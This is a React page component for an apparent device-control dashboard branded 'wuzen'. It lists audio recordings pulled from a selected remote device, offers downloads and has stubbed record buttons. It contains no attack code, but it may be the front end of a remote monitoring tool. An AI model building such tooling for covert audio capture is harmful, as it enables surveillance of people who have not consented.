import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import { microphone } from '../utils/api'
import { Mic, Play, Square, Volume2, Download } from 'lucide-react'

export default function MicrophonePage() {
  const { deviceId } = useParams()
  const [recordings, setRecordings] = useState([])
  const [recording, setRecording] = useState(false)

  useEffect(() => {
    if (deviceId) loadRecordings()
  }, [deviceId])

  const loadRecordings = async () => {
    const data = await microphone.list(deviceId)
    if (data) setRecordings(data)
  }

  const startRecording = () => setRecording(true)
  const stopRecording = () => setRecording(false)

  const downloadRecording = async (id) => {
    const data = await microphone.download(id)
    if (data?.url) window.open(data.url, '_blank')
  }

  return (
    <div className="animate-fade-in">
      <PageHeader title="Microphone" icon={Mic} onDeviceChange={() => {}}>
        <div className="flex items-center gap-2">
          {recording ? (
            <button onClick={stopRecording} className="wuzen-btn-danger">
              <Square className="w-4 h-4" /> STOP
            </button>
          ) : (
            <button onClick={startRecording} className="wuzen-btn-primary">
              <Play className="w-4 h-4" /> RECORD
            </button>
          )}
        </div>
      </PageHeader>

      <div className="wuzen-panel p-6">
        <div className="flex items-center justify-center h-32 mb-6">
          {recording ? (
            <div className="flex items-center gap-1">
              {Array.from({ length: 20 }).map((_, i) => (
                <div
                  key={i}
                  className="w-1 bg-wuzen-primary rounded-full animate-pulse"
                  style={{
                    height: `${Math.random() * 60 + 10}px`,
                    animationDelay: `${i * 0.05}s`
                  }}
                />
              ))}
            </div>
          ) : (
            <Mic className="w-12 h-12 text-wuzen-muted" />
          )}
        </div>

        <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-3">Recordings</h3>
        <div className="space-y-2">
          {recordings.map(r => (
            <div key={r.id} className="flex items-center gap-3 p-3 rounded bg-wuzen-card">
              <Volume2 className="w-4 h-4 text-wuzen-primary" />
              <div className="flex-1">
                <p className="text-sm">Recording #{r.id?.slice(0, 8)}</p>
                <p className="text-xs text-wuzen-muted">{r.duration}s | {r.sample_rate}Hz | {(r.file_size / 1024).toFixed(1)} KB</p>
              </div>
              <button onClick={() => downloadRecording(r.id)} className="p-2 rounded hover:bg-wuzen-panel text-wuzen-primary">
                <Download className="w-4 h-4" />
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
